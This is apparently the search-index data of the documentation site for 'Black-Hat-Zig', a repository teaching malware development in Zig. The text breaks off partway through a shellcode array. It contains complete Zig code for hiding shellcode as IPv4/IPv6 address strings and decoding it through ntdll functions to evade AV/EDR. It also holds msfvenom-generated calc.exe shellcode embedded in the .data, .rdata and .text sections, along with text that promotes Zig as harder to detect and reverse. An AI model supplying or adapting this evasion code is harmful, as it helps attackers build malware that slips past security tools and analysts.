{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Black-Hat-Zig","text":"<p> Hello hackers. Hello maldevs. Hello reversers. Nice to see you here to explore the dark power of Zig! Maintained and managed by @CX330Blake </p>"},{"location":"#intro","title":"Intro","text":"<p>This project is continuously updating!</p> <p>This project provides many malware techniques implementation using Zig since I'm a huge fan of it. You can use this repo to weaponize Zig. Black-Hat-Zig is continuously updating to make sure it contains as more content as it could. It will be perfect if you want to create a PR for this project.</p> <p>Okay, let's hack the planet!</p>"},{"location":"#why-zig","title":"Why Zig?","text":"<ul> <li>\ud83e\udd1d Easy to interact with C/C++ source</li> <li>\ud83d\udd0e It's newer, so it's harder to be detect</li> <li>\ud83d\udcaa Strongly low level control, even lower than C</li> <li>\ud83d\ude31 It's harder to RE because of the modern compiler</li> <li>\ud83d\udee1\ufe0f Minimal runtime dependencies - No massive standard library footprint</li> <li>\ud83c\udfaf No undefined behavior - Explicit handling of edge cases prevents crashes</li> </ul>"},{"location":"#contributors","title":"Contributors","text":"<p>This project is mainly maintained &amp; managed by @CX330Blake. PRs are welcomed. Hope there's more people use Zig for malware developing so the ecosystem will be more mature.</p> <p>Huge thanks for these contributors!</p> <p> </p>"},{"location":"#credits-references","title":"Credits &amp; References","text":"<ul> <li>Maldev Academy</li> <li>OffensiveNim</li> </ul>"},{"location":"#star-history","title":"Star History","text":""},{"location":"#disclaimer","title":"Disclaimer","text":"<p>This project is for ethical and educational purpose only. Don't be a cyber criminal.</p>"},{"location":"epilogue/","title":"Epilogue","text":"<p>Thanks. If you like this repo please give a star!</p>"},{"location":"prologue/","title":"Before We Start","text":""},{"location":"prologue/#prerequisites","title":"Prerequisites","text":"<ul> <li>Windows environment<ul> <li>The code can be compiled on Linux/MacOS, but still need a Windows environment to execute</li> </ul> </li> <li>Zig &gt;= 0.14.0</li> <li>ZYPE installed<ul> <li>ZYPE is a tool we will often used here. To install, please visit ZYPE</li> </ul> </li> </ul>"},{"location":"prologue/#compiling-the-codes","title":"Compiling The Codes","text":"<p>The compilation is easy thanks to the good support for Zig's cross compilation. To build a Windows binary, we have three way to achieve it.</p> <ol> <li>Add <code>-Dtarget</code> flag to the <code>zig build</code> or <code>zig build-exe</code> command during the compilation.</li> <li>Simply run <code>zig-build</code> or <code>zig-build-exe</code> on a Windows machine.</li> <li>Set the default target architecture and OS in the <code>build.zig</code>.</li> </ol> <p>Here we'll use the third method to do this, so that no matter which OS you're using, you can simply run <code>zig build</code> to build the binary. For more details, this is the configuration I set for every projects that depend on Windows API.</p> <pre><code>const target = b.standardTargetOptions(.{ .default_target = .{\n    .cpu_arch = .x86_64,\n    .os_tag = .windows\n}});\n</code></pre>"},{"location":"prologue/#other-useful-tools","title":"Other Useful Tools","text":"<ul> <li>ZYRA: Your Runtime Armor<ul> <li>An executable packer written in Zig</li> </ul> </li> </ul>"},{"location":"Payload-Obfuscation/ip_addr/","title":"IP Address Obfuscation","text":""},{"location":"Payload-Obfuscation/ip_addr/#tldr","title":"TL;DR","text":"<p>See the code example</p>"},{"location":"Payload-Obfuscation/ip_addr/#intro","title":"Intro","text":"<p>Actually, to evade AV/EDR, you can do more than just hiding your payload in different section. You need to obfuscate the code so that the reverse engineers and malware analyst can't get the clear logic, control flow, or meaningful strings without heavily static or dynamic analysis.</p> <p>In this chapter, I will show you how to obfuscate your payload as IP address. We have both IPv4 and IPv6. Also, we provide the deobfuscation functions so that you can run the actual payload later on your malware.</p>"},{"location":"Payload-Obfuscation/ip_addr/#ipv4-obfuscation","title":"IPv4 Obfuscation","text":"<p>Source code</p> main.zig<pre><code>const std = @import(\"std\");\nconst Allocator = std.mem.Allocator;\n\n// Function takes in 4 raw bytes and returns them in an IPv4 string format\nfn generateIpv4(allocator: Allocator, a: u8, b: u8, c: u8, d: u8) ![]u8 {\n    // Creating the IPv4 address string\n    return try std.fmt.allocPrint(allocator, \"{d}.{d}.{d}.{d}\", .{ a, b, c, d });\n}\n\n/// Generate the IPv4 output representation of the shellcode\n/// Function requires an allocator and shellcode as the input\nfn generateIpv4Output(allocator: Allocator, shellcode: []const u8) !bool {\n    const stdout = std.io.getStdOut().writer();\n\n    // If the shellcode buffer is empty or the size is not a multiple of 4, exit\n    if (shellcode.len == 0 or shellcode.len % 4 != 0) {\n        return false;\n    }\n\n    try stdout.print(\"const ipv4_array = [_][*:0]const u8{{\\n\\t\", .{});\n\n    // We will read one shellcode byte at a time, when the total is 4, begin generating the IPv4 address\n    // The variable 'c' is used to store the number of bytes read. By default, starts at 4.\n    var c: usize = 4;\n    var counter: usize = 0;\n\n    var i: usize = 0;\n    while (i &lt; shellcode.len) : (i += 1) {\n        // Track the number of bytes read and when they reach 4 we enter this if statement to begin generating the IPv4 address\n        if (c == 4) {\n            counter += 1;\n\n            // Generating the IPv4 address from 4 bytes which begin at i until [i + 3]\n            const ip = try generateIpv4(allocator, shellcode[i], shellcode[i + 1], shellcode[i + 2], shellcode[i + 3]);\n            defer allocator.free(ip); // Free the allocated string when done\n\n            if (i == shellcode.len - 4) {\n                // Printing the last IPv4 address\n                try stdout.print(\"\\\"{s}\\\"\", .{ip});\n                break;\n            } else {\n                // Printing the IPv4 address\n                try stdout.print(\"\\\"{s}\\\", \", .{ip});\n            }\n\n            c = 1;\n\n            // Optional: To beautify the output on the console\n            if (counter % 8 == 0) {\n                try stdout.print(\"\\n\\t\", .{});\n            }\n        } else {\n            c += 1;\n        }\n    }\n\n    try stdout.print(\"\\n}};\\n\\n\", .{});\n    return true;\n}\n\npub fn main() !void {\n    // Create an arena allocator that frees all allocations at once at the end\n    var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);\n    defer arena.deinit();\n\n    const allocator = arena.allocator();\n    // Example shellcode (must be a multiple of 4 bytes)\n    const shellcode = [_]u8{\n        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, // Add more shellcode here if needed\n    };\n\n    // Generate and print the IPv4 representation\n    _ = try generateIpv4Output(allocator, &amp;shellcode);\n}\n</code></pre>"},{"location":"Payload-Obfuscation/ip_addr/#ipv4-deobfuscation","title":"IPv4 Deobfuscation","text":"<p>Source code</p> main.zig<pre><code>const std = @import(\"std\");\nconst win = std.os.windows;\nconst kernel32 = win.kernel32;\n\nconst NTSTATUS = win.NTSTATUS;\nconst BOOLEAN = win.BOOLEAN;\nconst PCSTR = [*:0]const u8;\nconst PVOID = ?*anyopaque;\nconst PBYTE = [*]u8;\nconst SIZE_T = usize;\n\n// Define function pointer type for RtlIpv4StringToAddressA\nconst fnRtlIpv4StringToAddressA = fn (\n    S: PCSTR,\n    Strict: BOOLEAN,\n    Terminator: *PCSTR,\n    Addr: PVOID,\n) callconv(win.WINAPI) NTSTATUS;\n\n/// Deobfuscates an array of IPv4 strings into a byte buffer\npub fn ipv4Deobfuscation(\n    ipv4Array: []const [*:0]const u8,\n    allocator: std.mem.Allocator,\n) !struct { buffer: []u8, size: SIZE_T } {\n    // Create a UTF-16 string for \"NTDLL\"\n    const ntdll_w: [*:0]const u16 = std.unicode.utf8ToUtf16LeStringLiteral(\"NTDLL\");\n\n    // Load the NTDLL library using wide string\n    const ntdll_module = kernel32.GetModuleHandleW(ntdll_w);\n    if (ntdll_module == null) {\n        std.debug.print(\"[!] GetModuleHandle Failed With Error : {}\\n\", .{kernel32.GetLastError()});\n        return error.GetModuleHandleFailed;\n    }\n\n    // Get the address of RtlIpv4StringToAddressA function\n    const rtlIpv4StringToAddressA_ptr = kernel32.GetProcAddress(ntdll_module.?, \"RtlIpv4StringToAddressA\");\n    if (rtlIpv4StringToAddressA_ptr == null) {\n        std.debug.print(\"[!] GetProcAddress Failed With Error : {}\\n\", .{kernel32.GetLastError()});\n        return error.GetProcAddressFailed;\n    }\n\n    // Cast the function pointer to the correct type\n    const rtlIpv4StringToAddressA: *const fnRtlIpv4StringToAddressA = @ptrCast(rtlIpv4StringToAddressA_ptr);\n\n    // Calculate the size of the buffer needed (number of IPv4 addresses * 4 bytes each)\n    const bufferSize = ipv4Array.len * 4;\n\n    // Allocate memory for the deobfuscated shellcode\n    var buffer = try allocator.alloc(u8, bufferSize);\n    errdefer allocator.free(buffer);\n\n    // Deobfuscate each IPv4 address\n    for (ipv4Array, 0..) |ipAddress, i| {\n        var terminator: PCSTR = undefined;\n\n        // Calculate the offset in the buffer for this IPv4 address\n        const offset = i * 4;\n\n        // Convert the IPv4 string to bytes\n        const status = rtlIpv4StringToAddressA(ipAddress, win.FALSE, &amp;terminator, &amp;buffer[offset]);\n\n        // Check if the status is not SUCCESS (0)\n        // Use the proper status constant from the ntstatus module\n        if (status != NTSTATUS.SUCCESS) {\n            std.debug.print(\"[!] RtlIpv4StringToAddressA Failed At [{s}] With Error 0x{X:0&gt;8}\\n\", .{ ipAddress, @intFromEnum(status) });\n            return error.RtlIpv4StringToAddressFailed;\n        }\n    }\n\n    return .{ .buffer = buffer, .size = bufferSize };\n}\n\npub fn main() !void {\n    // Setup allocator\n    var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);\n    defer arena.deinit();\n    const allocator = arena.allocator();\n\n    // Example array of IPv4 addresses\n    const ipv4_array = [_][*:0]const u8{ \"252.72.131.228\", \"240.232.192.0\", \"0.0.65.81\", \"65.80.82.81\" };\n    std.debug.print(\"[+] Attempting to deobfuscate {} IPv4 addresses\\n\", .{ipv4_array.len});\n\n    // Call the deobfuscation function\n    const result = try ipv4Deobfuscation(&amp;ipv4_array, allocator);\n    defer allocator.free(result.buffer);\n\n    std.debug.print(\"[+] Successfully deobfuscated shellcode\\n\", .{});\n    std.debug.print(\"[+] Buffer size: {} bytes\\n\", .{result.size});\n\n    // Optionally print the bytes (first 16 bytes or fewer if smaller)\n    const bytes_to_print = @min(result.size, 16);\n    std.debug.print(\"[+] First {} bytes: \", .{bytes_to_print});\n    for (result.buffer[0..bytes_to_print]) |byte| {\n        std.debug.print(\"{X:0&gt;2} \", .{byte});\n    }\n    std.debug.print(\"\\n\", .{});\n}\n</code></pre>"},{"location":"Payload-Obfuscation/ip_addr/#ipv6-obfuscation","title":"IPv6 Obfuscation","text":"<p>Source code</p> main.zig<pre><code>const std = @import(\"std\");\nconst Allocator = std.mem.Allocator;\n\n/// Function takes in 16 raw bytes and returns them in an IPv6 address string format\nfn generateIpv6(allocator: Allocator, bytes: [16]u8) ![]u8 {\n    // Each segment is 2 bytes (4 hex characters + colon)\n    // Format as 8 segments of 2 bytes each with colons between them\n    return try std.fmt.allocPrint(\n        allocator,\n        \"{X:0&gt;2}{X:0&gt;2}:{X:0&gt;2}{X:0&gt;2}:{X:0&gt;2}{X:0&gt;2}:{X:0&gt;2}{X:0&gt;2}:{X:0&gt;2}{X:0&gt;2}:{X:0&gt;2}{X:0&gt;2}:{X:0&gt;2}{X:0&gt;2}:{X:0&gt;2}{X:0&gt;2}\",\n        .{\n            bytes[0],  bytes[1],  bytes[2],  bytes[3],\n            bytes[4],  bytes[5],  bytes[6],  bytes[7],\n            bytes[8],  bytes[9],  bytes[10], bytes[11],\n            bytes[12], bytes[13], bytes[14], bytes[15],\n        },\n    );\n}\n\n/// Generate the IPv6 output representation of the shellcode\n/// Function requires a slice to the shellcode buffer\nfn generateIpv6Output(allocator: Allocator, shellcode: []const u8) !bool {\n    const stdout = std.io.getStdOut().writer();\n\n    // If the shellcode buffer is empty or the size is not a multiple of 16, exit\n    if (shellcode.len == 0 or shellcode.len % 16 != 0) {\n        return false;\n    }\n\n    try stdout.print(\"const ipv6_array = [_][*:0]const u8{{\\n    \", .{});\n\n    // We will read one shellcode byte at a time, when the total is 16, begin generating the IPv6 address\n    // The variable 'c' is used to store the number of bytes read. By default, starts at 16.\n    var c: usize = 16;\n    var counter: usize = 0;\n\n    var i: usize = 0;\n    while (i &lt; shellcode.len) : (i += 1) {\n        // Track the number of bytes read and when they reach 16 we enter this if statement to begin generating the IPv6 address\n        if (c == 16) {\n            counter += 1;\n\n            // Create a temporary array to hold the 16 bytes\n            var temp_bytes: [16]u8 = undefined;\n            @memcpy(temp_bytes[0..], shellcode[i..][0..16]);\n\n            // Generating the IPv6 address from 16 bytes\n            const ip = try generateIpv6(allocator, temp_bytes);\n            defer allocator.free(ip);\n\n            if (i == shellcode.len - 16) {\n                // Printing the last IPv6 address\n                try stdout.print(\"\\\"{s}\\\"\", .{ip});\n                break;\n            } else {\n                // Printing the IPv6 address\n                try stdout.print(\"\\\"{s}\\\", \", .{ip});\n            }\n\n            c = 1;\n\n            // Optional: To beautify the output on the console\n            if (counter % 3 == 0) {\n                try stdout.print(\"\\n    \", .{});\n            }\n        } else {\n            c += 1;\n        }\n    }\n\n    try stdout.print(\"\\n}};\\n\\n\", .{});\n    return true;\n}\n\npub fn main() !void {\n    // Create an arena allocator for efficient memory management\n    var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);\n    defer arena.deinit();\n\n    const allocator = arena.allocator();\n\n    // Example shellcode (must be a multiple of 16 bytes)\n    const shellcode = [_]u8{\n        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, // Add more shellcode here if needed\n    };\n\n    // Generate and print the IPv6 representation\n    _ = try generateIpv6Output(allocator, &amp;shellcode);\n}\n</code></pre>"},{"location":"Payload-Obfuscation/ip_addr/#ipv6-deobfuscation","title":"IPv6 Deobfuscation","text":"<p>Source code</p> main.zig<pre><code>const std = @import(\"std\");\nconst win = std.os.windows;\nconst kernel32 = win.kernel32;\n\nconst NTSTATUS = win.NTSTATUS;\nconst BOOLEAN = win.BOOLEAN;\nconst PCSTR = [*:0]const u8;\nconst PVOID = ?*anyopaque;\nconst PBYTE = [*]u8;\nconst SIZE_T = usize;\n\n// Define function pointer type for RtlIpv6StringToAddressA\nconst fnRtlIpv6StringToAddressA = fn (\n    S: PCSTR,\n    Terminator: *PCSTR,\n    Addr: PVOID,\n) callconv(win.WINAPI) NTSTATUS;\n\n/// Deobfuscates an array of IPv6 strings into a byte buffer\npub fn ipv6Deobfuscation(\n    ipv6Array: []const [*:0]const u8,\n    allocator: std.mem.Allocator,\n) !struct { buffer: []u8, size: SIZE_T } {\n    // Create a UTF-16 string for \"NTDLL\"\n    const ntdll_w: [*:0]const u16 = std.unicode.utf8ToUtf16LeStringLiteral(\"NTDLL\");\n\n    // Load the NTDLL library using wide string\n    const ntdll_module = kernel32.GetModuleHandleW(ntdll_w);\n    if (ntdll_module == null) {\n        std.debug.print(\"[!] GetModuleHandle Failed With Error : {}\\n\", .{kernel32.GetLastError()});\n        return error.GetModuleHandleFailed;\n    }\n\n    // Get the address of RtlIpv6StringToAddressA function\n    const rtlIpv6StringToAddressA_ptr = kernel32.GetProcAddress(ntdll_module.?, \"RtlIpv6StringToAddressA\");\n    if (rtlIpv6StringToAddressA_ptr == null) {\n        std.debug.print(\"[!] GetProcAddress Failed With Error : {}\\n\", .{kernel32.GetLastError()});\n        return error.GetProcAddressFailed;\n    }\n\n    // Cast the function pointer to the correct type\n    const rtlIpv6StringToAddressA: *const fnRtlIpv6StringToAddressA = @ptrCast(rtlIpv6StringToAddressA_ptr);\n\n    // Calculate the size of the buffer needed (number of IPv6 addresses * 16 bytes each)\n    const bufferSize = ipv6Array.len * 16; // IPv6 addresses are 16 bytes each\n\n    // Allocate memory for the deobfuscated shellcode\n    const buffer = try allocator.alloc(u8, bufferSize);\n    errdefer allocator.free(buffer);\n\n    // Using a raw pointer to keep track of our current position\n    var tmpBuffer: [*]u8 = buffer.ptr;\n\n    // Deobfuscate each IPv6 address\n    for (ipv6Array) |ipv6Address| {\n        var terminator: PCSTR = undefined;\n\n        // Convert the IPv6 string to bytes\n        const status = rtlIpv6StringToAddressA(ipv6Address, &amp;terminator, tmpBuffer);\n\n        // Check if the status is not SUCCESS (0)\n        if (status != NTSTATUS.SUCCESS) {\n            std.debug.print(\"[!] RtlIpv6StringToAddressA Failed At [{s}] With Error 0x{X:0&gt;8}\\n\", .{ ipv6Address, @intFromEnum(status) });\n            return error.RtlIpv6StringToAddressFailed;\n        }\n\n        // Increment tmpBuffer by 16 bytes for the next address\n        // Fixed version using pointer arithmetic\n        tmpBuffer = @as([*]u8, @ptrFromInt(@intFromPtr(tmpBuffer) + 16));\n    }\n\n    return .{ .buffer = buffer, .size = bufferSize };\n}\n\npub fn main() !void {\n    // Setup allocator\n    var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);\n    defer arena.deinit();\n    const allocator = arena.allocator();\n\n    // Example array of IPv6 addresses (shellcode encoded as IPv6)\n    const ipv6_array = [_][*:0]const u8{\n        \"fc48:83e4:f0e8:c000:0000:4151:4150:5251\",\n    };\n\n    std.debug.print(\"[+] Attempting to deobfuscate {} IPv6 addresses\\n\", .{ipv6_array.len});\n\n    // Call the deobfuscation function\n    const result = try ipv6Deobfuscation(&amp;ipv6_array, allocator);\n    defer allocator.free(result.buffer);\n\n    std.debug.print(\"[+] Successfully deobfuscated shellcode\\n\", .{});\n    std.debug.print(\"[+] Buffer size: {} bytes\\n\", .{result.size});\n\n    // Print all bytes\n    std.debug.print(\"[+] Deobfuscated bytes: \", .{});\n    for (result.buffer) |byte| {\n        std.debug.print(\"{X:0&gt;2} \", .{byte});\n    }\n    std.debug.print(\"\\n\", .{});\n}\n</code></pre>"},{"location":"Payload-Placement/dot_data/","title":"Put payload in .data section","text":""},{"location":"Payload-Placement/dot_data/#tldr","title":"TL;DR","text":"<p>See the code example</p>"},{"location":"Payload-Placement/dot_data/#what-is-payload","title":"What Is Payload?","text":"<p>To execute the malicious code, we must load the malicious stuff into the binary somehow. And this malicious stuff, is the so called \"payload\" or \"shellcode\".</p> <p>We'll use the payload generated by MSFvenom for every examples in \"Payload Placement\". You can copy and paste the following command to generate the payload first. But since it's generated in C array format, I'll recommend you just copy and paste the corresponding payload in my code, which is already translated from C array to Zig array by AI.</p> <pre><code>msfvenom -p windows/x64/exec CMD=calc.exe -f c\n</code></pre>"},{"location":"Payload-Placement/dot_data/#sections","title":"Sections","text":"<p>For those who visited this project, I'll assume you already know what is \"section\" and know the basics of the following common sections.</p> <ul> <li>.bss section<ul> <li>Uninitialized global variables</li> </ul> </li> <li>.data section<ul> <li>Initialized global variables</li> </ul> </li> <li>.rdata section<ul> <li>Read-only data (strings, vtable, etc)</li> </ul> </li> <li>.text section<ul> <li>Code segment, stores machine codes</li> </ul> </li> <li>.rsrc section<ul> <li>Resource section, only exists on Windows. It often stores graph, icon, etc</li> </ul> </li> </ul> <p>For more details: Special Sections - MSDN.</p>"},{"location":"Payload-Placement/dot_data/#code-explanation","title":"Code Explanation","text":"<p>In this chapter, I will show you how to store out payload into .data section.</p> main.zig<pre><code>const std = @import(\"std\");\nconst print = std.debug.print;\n\n// msfvenom calc shellcode\n// msfvenom -p windows/x64/exec CMD=calc.exe -f c\n// .data saved payload (var data goes to .data section in Zig)\nvar data_section_payload = [_]u8{\n    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,\n    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,\n    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,\n    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,\n    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,\n    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,\n    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,\n    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,\n    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,\n    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,\n    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,\n    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,\n    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,\n    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,\n    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,\n    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,\n    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,\n    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,\n    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,\n    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,\n    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,\n    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,\n    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00,\n};\n\n/// Helper function to wait for Enter key\n/// Similar usage as `getchar()` in C\nfn waitForEnter() void {\n    var buffer: [256]u8 = undefined;\n    _ = std.io.getStdIn().reader().readUntilDelimiterOrEof(buffer[0..], '\\n') catch {};\n}\n\npub fn main() !void {\n    print(\"[i] Payload address: 0x{X} \\n\", .{@intFromPtr(&amp;data_section_payload)});\n    print(\"[i] Data size: {d} bytes\\n\", .{data_section_payload.len});\n    print(\"[i] Payload stored in .data section (read-write)\\n\", .{});\n    print(\"[#] Press &lt;Enter&gt; To Quit ...\", .{});\n    waitForEnter();\n}\n</code></pre> <p>Actually, it's easy to put the payload in .data section, just declare a global var and that's it! Although it's simple, it's also easy for malware analyst and reverse engineer to notice that. And it hash high possibility to be detected for most of the AV/EDR.</p>"},{"location":"Payload-Placement/dot_rdata/","title":"Put payload in .rdata section","text":""},{"location":"Payload-Placement/dot_rdata/#tldr","title":"TL;DR","text":"<p>See the code example</p>"},{"location":"Payload-Placement/dot_rdata/#code-explanation","title":"Code Explanation","text":"<p>In this chapter, I will show you how to store out payload into .rdata section.</p> main.zig<pre><code>const std = @import(\"std\");\nconst print = std.debug.print;\n\n// msfvenom calc shellcode\n// msfvenom -p windows/x64/exec CMD=calc.exe -f c\n// .rdata saved payload\n//\n// use `const` to put it in .rdata (read-only data)\nconst rdata_section_payload = [_]u8{\n    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,\n    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,\n    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,\n    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,\n    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,\n    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,\n    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,\n    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,\n    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,\n    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,\n    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,\n    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,\n    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,\n    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,\n    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,\n    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,\n    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,\n    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,\n    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,\n    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,\n    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,\n    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,\n    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00,\n};\n\n// Helper function to wait for Enter key\nfn waitForEnter() void {\n    var buffer: [256]u8 = undefined;\n    _ = std.io.getStdIn().reader().readUntilDelimiterOrEof(buffer[0..], '\\n') catch {};\n}\n\npub fn main() !void {\n    print(\"[i] Payload address: 0x{X} \\n\", .{@intFromPtr(&amp;rdata_section_payload)});\n    print(\"[i] Data size: {d} bytes\\n\", .{rdata_section_payload.len});\n    print(\"[#] Press &lt;Enter&gt; To Quit ...\", .{});\n    waitForEnter();\n}\n</code></pre> <p>Add the payload to .rdata section is easy too. The only difference between the previous one is we changed the <code>var</code> to <code>const</code>. That way, the payload will become read-only and be placed in.rdata section.</p>"},{"location":"Payload-Placement/dot_rsrc/","title":"Put payload in .rsrc section","text":"<p>Currently unavailable. See https://github.com/CX330Blake/Black-Hat-Zig/issues/5</p>"},{"location":"Payload-Placement/dot_text/","title":"Put payload in .text section","text":""},{"location":"Payload-Placement/dot_text/#tldr","title":"TL;DR","text":"<p>See the code example</p>"},{"location":"Payload-Placement/dot_text/#code-explanation","title":"Code Explanation","text":"<p>In this chapter, I will show you how to store out payload into .text section.</p> main.zig<pre><code>const std = @import(\"std\");\nconst print = std.debug.print;\n\n// msfvenom calc shellcode\n// msfvenom -p windows/x64/exec CMD=calc.exe -f c\n// .text saved payload - most elegant approach with automatic inference\nconst text_section_payload linksection(\".text\") = [_]u8{\n    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,\n    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,\n    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,\n    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,\n    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,\n    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,\n    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,\n    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,\n    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,\n    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,\n    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,\n    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,\n    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,\n    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,\n    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 